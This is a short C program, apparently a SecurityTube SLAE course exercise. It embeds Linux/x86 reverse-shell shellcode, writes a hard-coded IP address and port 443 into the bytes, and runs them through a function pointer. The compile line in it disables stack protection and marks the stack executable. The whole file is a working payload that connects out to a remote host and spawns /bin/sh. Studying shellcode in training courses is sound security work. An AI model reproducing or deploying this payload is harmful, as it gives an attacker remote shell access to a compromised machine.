/*
	Reverse Shell - Linux/x86 Shellcode
	Author: Nathu Nandwani
	SecurityTube ID: SLAE-1261
*/
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <arpa/inet.h>

//gcc -fno-stack-protector -z execstack execshell.c -o execshell

int main() 
{
	int ip = inet_addr("192.168.189.132");
	unsigned short port = 443;

	char code[] = "\x31\xc0\x31\xdb\x50\x50\x68\xc0\xa8\xbd\x84\x66\xbb\x01\xbb\xc1\xe3\x10\x80\xc3\x02\x53\x50\x6a\x01\x6a\x02\xb0\x66\x31\xdb\xb3\x01\x89\xe1\xcd\x80\x6a\x10\x8d\x5c\x24\x10\x53\x50\x31\xc0\xb0\x66\x31\xdb\xb3\x03\x89\xe1\xcd\x80\x8b\x1c\x24\x31\xc0\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x03\x75\xf6\x31\xc0\x50\x89\xc1\x89\xc2\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
	
	code[7] = ip & 0xff;
	code[8] = (ip >> 8) & 0xff;
	code[9] = (ip >> 16) & 0xff;
	code[10] = (ip >> 24) & 0xff;

	code[13] = (port >> 8) & 0xff;
	code[14] = port & 0xff;

	printf("Shellcode length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
